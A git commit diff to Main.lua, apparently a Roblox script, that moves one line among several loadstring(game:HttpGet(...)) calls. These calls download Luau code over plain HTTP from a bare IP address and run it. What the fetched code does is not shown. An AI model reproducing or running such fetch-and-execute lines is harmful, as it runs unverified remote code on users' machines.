8e92007be961d70b0427d027ba764acbb5f39793
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-27 20:20:32 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,3 +1,3 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
